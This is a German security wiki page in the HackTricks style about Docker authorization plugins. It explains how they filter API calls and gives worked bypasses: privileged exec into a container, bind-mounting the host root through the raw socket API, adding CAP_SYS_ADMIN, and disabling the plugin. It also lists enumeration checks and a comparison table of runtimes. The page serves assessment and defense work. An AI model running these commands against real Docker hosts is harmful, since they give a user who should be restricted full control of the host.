# Laufzeit-Autorisierungs-Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Laufzeit-Autorisierungs-Plugins sind eine zusätzliche Richtlinienebene, die entscheidet, ob ein Caller eine bestimmte Daemon-Aktion ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jede Person, die mit dem Docker daemon kommunizieren kann, effektiv weitreichende Kontrolle über ihn. Autorisierungs-Plugins versuchen, dieses Modell einzuschränken, indem sie die authentifizierte Benutzeridentität und die angeforderte API-Operation prüfen und die Anfrage gemäß der Richtlinie erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, weil es das Exploitationsmodell ändert, wenn ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker` group hat. In solchen Umgebungen lautet die Frage nicht mehr nur „kann ich den Daemon erreichen?“, sondern auch „ist der Daemon durch eine Autorisierungsschicht geschützt, und falls ja, kann diese Schicht über unbehandelte Endpunkte, schwache JSON-Parsing-Mechanismen oder Berechtigungen zur Plugin-Verwaltung umgangen werden?“

## Funktionsweise

Wenn eine Anfrage den Docker daemon erreicht, kann das Autorisierungssubsystem den Anfragekontext an ein oder mehrere installierte Plugins weiterreichen. Das Plugin sieht die authentifizierte Benutzeridentität, die Anfragedetails, ausgewählte Header und Teile des Anfrage- oder Response-Bodys, wenn der Content-Type geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell wirkt stark, aber seine Sicherheit hängt vollständig davon ab, wie vollständig der Richtlinienautor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie das top-level `Binds` übersieht oder die Plugin-Administration erlaubt, kann ein falsches Gefühl von Einschränkung erzeugen, während direkte privilege-escalation-Pfade weiterhin offenbleiben.

## Häufige Plugin-Ziele

Wichtige Bereiche für die Richtlinienüberprüfung sind:

- Endpunkte zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und namespace-sharing-Optionen
- `docker exec`-Verhalten
- Endpunkte für Plugin-Management
- jeder Endpunkt, der indirekt Laufzeit-Aktionen außerhalb des beabsichtigten Richtlinienmodells auslösen kann

Historisch machten Beispiele wie Twistlock's `authz`-Plugin und einfache Lehr-Plugins wie `authobot` dieses Modell leicht studierbar, weil ihre Policy-Dateien und Code-Pfade zeigten, wie Endpoint-zu-Action-Mapping tatsächlich implementiert wurde. Für Assessment-Arbeiten ist die wichtige Lehre, dass der Richtlinienautor die gesamte API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Missbrauch

Das erste Ziel ist herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion verweigert, zeigt die Fehlermeldung häufig den Plugin-Namen (leak), was hilft, die eingesetzte Kontrolle zu identifizieren:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn Sie eine umfassendere Endpoint-Analyse benötigen, sind Tools wie `docker_auth_profiler` nützlich, da sie die sonst repetitive Aufgabe automatisieren, zu prüfen, welche API-Routen und JSON-Strukturen vom Plugin tatsächlich erlaubt werden.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und Sie mit der API interagieren können, ermitteln Sie, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler eher feldspezifisch als konzeptuell sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die äquivalente API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt Privileg nach Containererstellung hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, jedoch die Erstellung nicht eingeschränkter Container plus `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess in einem container wiederhergestellt, den der Richtlinienautor für eingeschränkt hielt.

### Vollständiges Beispiel: Bind Mount Through Raw API

Einige fehlerhafte Richtlinien prüfen nur eine JSON-Form. Wenn das root filesystem bind mount nicht konsequent blockiert wird, kann der Host trotzdem noch gemountet werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dasselbe kann auch unter `HostConfig` auftreten:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist ein vollständiger Host-Dateisystem-Escape. Das interessante Detail ist, dass der Bypass von unvollständiger Policy-Abdeckung herrührt, nicht von einem Kernel-Fehler.

### Vollständiges Beispiel: Ungeprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability wiedererlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebene breakout techniques erreichbar.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn Plugin-Management-Operationen erlaubt sind, ist der sauberste bypass möglicherweise, die Kontrolle vollständig auszuschalten:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Policy-Fehler auf der Control-Plane-Ebene. Die Autorisierungsschicht existiert, aber der Benutzer, den sie einschränken sollte, besitzt weiterhin die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle dienen dazu festzustellen, ob eine Policy-Schicht existiert und ob sie vollständig oder nur oberflächlich wirkt.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was hier interessant ist:

- Ablehnungsnachrichten, die einen Plugin-Namen enthalten, bestätigen eine Autorisierungsschicht und verraten oft die genaue Implementierung.
- Eine für den Angreifer sichtbare Plugin-Liste kann ausreichen, um festzustellen, ob Deaktivierungs- oder Neukonfigurationsvorgänge möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, jedoch keine rohen API-Anfragen, sollte als umgehbar behandelt werden, bis das Gegenteil bewiesen ist.

## Standardwerte zur Laufzeit

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Daemon-Zugriff ist de facto alles-oder-nichts, sofern kein authorization plugin konfiguriert ist | unvollständige Plugin-Policy, Blacklists statt Allowlists, erlauben der Plugin-Verwaltung, feldbezogene blinde Flecken |
| Podman | Kein gängiges direktes Äquivalent | Podman setzt typischerweise eher auf Unix-Berechtigungen, rootless-Ausführung und Entscheidungen zur API-Exposition als auf Docker-ähnliche authz plugins | breite Exposition einer rootful Podman API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Anderes Kontrollmodell | Diese Runtimes verlassen sich normalerweise auf Socket-Berechtigungen, Node-Trust-Grenzen und Kontrollen des höher gelegenen Orchestrators, anstatt auf Docker authz plugins | Einbinden des Sockets in Workloads, schwache node-lokale Vertrauensannahmen |
| Kubernetes | Verwendet authn/authz auf API-server- und kubelet-Ebene, nicht Docker authz plugins | Cluster-RBAC und Admission-Controls sind die Haupt-Policy-Ebene | zu breite RBAC, schwache Admission-Policy, direktes Exponieren von kubelet- oder Runtime-APIs |
